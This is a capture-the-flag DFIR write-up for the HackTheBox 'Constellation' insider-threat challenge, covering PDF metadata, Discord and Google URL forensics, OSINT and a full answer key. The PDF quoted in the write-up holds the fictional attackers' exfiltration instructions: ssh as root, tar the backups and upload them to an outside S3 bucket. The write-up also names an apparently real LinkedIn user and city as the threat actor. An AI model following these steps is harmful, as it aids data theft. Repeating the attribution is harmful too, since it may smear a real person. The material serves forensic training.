# HTB-CONSTELLATION

<figure><img src="../../../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>



> \
> Scenario
>
> The SOC team has recently been alerted to the potential existence of an insider threat. The suspect employee’s workstation has been secured and examined. During the memory analysis, the Senior DFIR Analyst succeeded in extracting several intriguing URLs from the memory. These are now provided to you for further analysis to uncover any evidence, such as indications of data exfiltration or contact with malicious entities. Should you discover any information regarding the attacking group or individuals involved, you will collaborate closely with the threat intelligence team. Additionally, you will assist the Forensics team in creating a timeline. Warning : This Sherlock will require an element of OSINT and some answers can be found outside of the provided artifacts to complete fully.

## Questions <a href="#questions" id="questions"></a>

<details>

<summary>Questions</summary>



1. When did the suspect first start Direct Message (DM) conversations with the external entity (A possible threat actor group which targets organizations by paying employees to leak sensitive data)? (UTC)
2. What was the name of the file sent to the suspected insider threat?
3. When was the file sent to the suspected insider threat? (UTC)
4. The suspect utilised Google to search something after receiving the file. What was the search query?
5. The suspect originally typed something else in search tab, but found a Google search result suggestion which they clicked on. Can you confirm which words were written in search bar by the suspect originally?
6. When was this Google search made? (UTC)
7. What is the name of the Hacker group responsible for bribing the insider threat?
8. What is the name of the person suspected of being an Insider Threat?
9. What is the anomalous stated creation date of the file sent to the insider threat? (UTC)
10. The Forela threat intel team are working on uncovering this incident. Any OpSec mistakes made by the attackers are crucial for Forela’s security team. Try to help the TI team and confirm the real name of the agent/handler from Anticorp.
11. Which City does the threat actor belong to?

</details>

## ANALYSIS <a href="#analysis" id="analysis"></a>

### PDF Analysis <a href="#pdf-analysis" id="pdf-analysis"></a>

<details>

<summary>NDA_Instructions.pdf</summary>

Constellation Thanks For getting in touch with AntiCorp Gr04p, karen riley. We appreciate you in helping us get our hands on important data for forela. Ita high time we stand against billion dollars corporates who are playing monaply with common folks!! We are attaching instructions on how to get us the data securely. Follow these in same order.

1. Connect to the server: Using the ssh credentials you were able to find, logon to the server. Run this command : ssh root@server-IP . Enter password when prompted
2.
3. Once connected to the server, archive the folders containing databases and backups. To create a tar archive of a directory, use the following command:

tar -czvf archive.tar.gz /path/to/directory

This command will create a compressed tar archive of the folder.

4. After creating the archive, you can use the AWS Command Line Interface (CLI) to transfer the file to the S3 bucket. If you don't have the AWS CLI installed, you can follow the instructions here: https:// aws.amazon.com/cli/
5. Configure AWS CLI: Once the AWS CLI is installed, you need to configure it with your AWS credentials. Open a terminal and run the following command:

aws configure

It will prompt you to enter your AWS Access Key ID, Secret Access Key, default region, and default output format. Provide the required information based on your AWS account as provided by our agent to you. 6. With the AWS CLI configured, you can now upload the archive to the S3 bucket. Use the following command:

aws s3 cp /path/to/archive.tar.gz s3://hahaha-you-lose-forela/

Replace /path/to/archive.tar.gz with the actual path to your archive file. The s3://hahaha-you-loseforela/ represents the S3 bucket name and destination path.

7. After executing the command, the archive file will be uploaded to the specified S3 bucket. You can verify the upload by checking the AWS S3 console or by running the following command:

aws s3 ls s3://hahaha-you-lose-forela/

This command will list the contents of the specified S3 bucket. As promised $20000 dollars will be sent to you via paypal account.

</details>

Taking a look at the content of the provided PDF file already tells me a great deal about the insider threat.

1. The external threat actors uses the handle `AntiCorp Gr04p`. Which seem rather unique and should result in some high fidelity OSINT findings.
2. The internal employee, which was in contact with the threat actor, is `Karen Riley`.
3. As you can see in the highlighted lines, we know exactly what commands the insider was supposed to execute.

```python
┌──(sn0x㉿sn0x)-[~/HTB/Constellation]
└─$ $ exiftool NDA_Instructions.pdf
ExifTool Version Number         : 12.99
File Name                       : NDA_Instructions.pdf
Directory                       : .
File Size                       : 26 kB
File Modification Date/Time     : 2024:03:05 11:02:19+01:00
File Access Date/Time           : 2024:10:26 14:24:29+02:00
File Creation Date/Time         : 2024:10:26 14:18:36+02:00
File Permissions                : -rw-rw-rw-
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 1
Producer                        : AntiCorp PDF FW
Create Date                     : 2054:01:17 22:45:22+01:00
Title                           : KarenForela_Instructions
Author                          : CyberJunkie@AntiCorp.Gr04p
Creator                         : AntiCorp
Modify Date                     : 2054:01:17 22:45:22+01:00
Subject                         : Forela_Mining stats and data campaign (Stop destroying env)
```

Looking deeper into the PDF, I focus on its **metadata**, which not only confirms some information from the PDF content but also reveals additional details. To extract the metadata, I use the well-known tool **exiftool**.

* The **CreateDate** timestamp has been tampered with, showing a bogus value: `2054:01:17 22:45:22+01:00`.
* The fields **Producer**, **Author**, and **Creator** indicate that the document was handled by someone using the handle **AntiCorp.Gr04p**.
* A potential username, **CyberJunkie**, is also revealed; however, this appears to be the creator of the Sherlock report rather than an actual threat actor.
* Finally, the **Title** field confirms that the file was addressed to an employee named **Karen**.



## OSINT

<figure><img src="../../../.gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>

With a potential handle of the threat actor identified a simple Google Dork query will lead me straight to an associated LinkedIn profile.

<figure><img src="../../../.gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure>

Based on the distinctive style of the handle and the company name, I assess with **medium confidence** that **Abdullah Al Sajjad** is at least **associated with the threat actor**. Their poor operational security is further evident, as they have also included their **location: Bahawalpur, Punjab, Pakistan** in their profile.

<figure><img src="../../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

A post by `Abdullah Al Sajjad` confirms that they our threat actor, since given mail matches the one from the PDF metadata and that they are looking people proficient in developing initial access payloads.

### URL Analysis <a href="#url-analysis" id="url-analysis"></a>

```
hxxps[://]cdn[.]discordapp[.]com/attachments/1152635915429232640/1156461980652154931/NDA_Instructions[.]pdf?ex=65150ea6&is=6513bd26&hm=64de12da031e6e91cc4f35c64b2b0190fb040b69648a64365f8a8260760656e3&
hxxps[://]www[.]google[.]com/search?q=how+to+zip+a+folder+using+tar+in+linux&sca_esv=568736477&hl=en&sxsrf=AM9HkKkFWLlX_hC63KqDpJwdH9M3JL7LZA%3A1695792705892&source=hp&ei=Qb4TZeL2M9XPxc8PwLa52Ag&iflsig=AO6bgOgAAAAAZRPMUXuGExueXDMxHxU9iRXOL-GQIJZ-&oq=How+to+archive+a+folder+using+tar+i&gs_lp=Egdnd3Mtd2l6IiNIb3cgdG8gYXJjaGl2ZSBhIGZvbGRlciB1c2luZyB0YXIgaSoCCAAyBhAAGBYYHjIIEAAYigUYhgMyCBAAGIoFGIYDMggQABiKBRiGA0jI3QJQ8WlYxIUCcAx4AJABAJgBqQKgAeRWqgEEMi00NrgBAcgBAPgBAagCCsICBxAjGOoCGCfCAgcQIxiKBRgnwgIIEAAYigUYkQLCAgsQABiABBixAxiDAcICCBAAGIAEGLEDwgILEAAYigUYsQMYgwHCAggQABiKBRixA8ICBBAjGCfCAgcQABiKBRhDwgIOEC4YigUYxwEY0QMYkQLCAgUQABiABMICDhAAGIoFGLEDGIMBGJECwgIFEC4YgATCAgoQABiABBgUGIcCwgIFECEYoAHCAgUQABiiBMICBxAhGKABGArCAggQABgWGB4YCg&sclient=gws-wiz

```

The second piece of evidence I am provided with are two URL that the SOC was able recover during the memory analysis of Karen’s computer. As you can see the amount of URL parameters can become rather egregious for Google URLs. It is possible to manually split the URLs at the `&` signs and figure out the meaning of each parameter by hand. However the more comfortable way is to use a tool called **unfurl**, which hosted [here](https://dfir.blog/unfurl/). This does the splitting and converting of known URL parameters all by itself.

#### Discord URL <a href="#discord-url" id="discord-url"></a>

<figure><img src="../../../.gitbook/assets/image (189).png" alt=""><figcaption></figcaption></figure>

The relevant parts of this URL (to the current case) are the `Channel ID` and the `File ID`. Both IDs are actually so called Snowflake timestamps, which you can also manually convert yourself using a converter like [snowsta.mp](https://snowsta.mp/).

<figure><img src="../../../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>

The `Channel ID` is actually just the timestamp of the very first message of a conversation, when talking about direct messages, since this coincides with the creation of the direct message channel between two parties. So I know that the threat actor initially messaged Karen at `2023-09-16 16:03:37`.

<figure><img src="../../../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>

Either through the `File ID` or the `ex`, `is` URL parameters I can determine the time when a Discord attachment was shared. The former is just another Snowflake timestamp which is reused as an ID and is the time when the document was shared. The `ex` parameter however describes when a Discord attachment URL expires, in which another URL has to be retrieved. `is` describes the timestamp when the attachment URL was issued, which is also the time when an attachment was sent. Few more deatils about these parameter can be found in this [Reddit post](https://www.reddit.com/r/DataHoarder/comments/16zs1gt/cdndiscordapp_links_will_expire_breaking/).

### Google Query

<figure><img src="../../../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

The amount of unfurled URL parameters goes way beyond what is shown in the picture, but since the Discord image is already barely legible, I instead focus on only the relevant pieces.

`q` tells me that the current search query is `how to zip a folder using tar in linux`, were as `oq` tells me about the original query which is slightly different `How to archive a folder using tar i`.

The `sxsrf` parameter and also the `ei` parameter, which is offscreen, tell me about when the Google search was made.



## Answers <a href="#answers" id="answers"></a>

<details>

<summary>Answers</summary>



1. When did the suspect first start Direct Message (DM) conversations with the external entity (A possible threat actor group which targets organizations by paying employees to leak sensitive data)? (UTC)

* `2023-09-16 16:03:37` unfurl Discord URL

2. What was the name of the file sent to the suspected insider threat?

* `NDA_Instructions.pdf` unfurl Discord URL

3. When was the file sent to the suspected insider threat? (UTC)

* `2023-09-27 05:27:02` unfurl Discord URL

4. The suspect utilised Google to search something after receiving the file. What was the search query?

* `how to zip a folder using tar in linux` unfurl Google query

5. The suspect originally typed something else in search tab, but found a Google search result suggestion which they clicked on. Can you confirm which words were written in search bar by the suspect originally?

* `How to archive a folder using tar i` unfurl Google query

6. When was this Google search made? (UTC)

* `2023-09-27 05:31:45` unfurl Google query

7. What is the name of the Hacker group responsible for bribing the insider threat?

* `AntiCorp Gr04p` within PDF and its metadata

8. What is the name of the person suspected of being an Insider Threat?

* `Karen Riley` within PDF

9. What is the anomalous stated creation date of the file sent to the insider threat? (UTC)

* `2054-01-17 22:45:22` PDF metadata

10. The Forela threat intel team are working on uncovering this incident. Any OpSec mistakes made by the attackers are crucial for Forela’s security team. Try to help the TI team and confirm the real name of the agent/handler from Anticorp.

* `Abdullah Al Sajjad` OSINT Linkedin

11. Which City does the threat actor belong to?

* `Bahawalpur` OSINT Linkedin

</details>

<figure><img src="../../../.gitbook/assets/complete (31).gif" alt=""><figcaption></figcaption></figure>
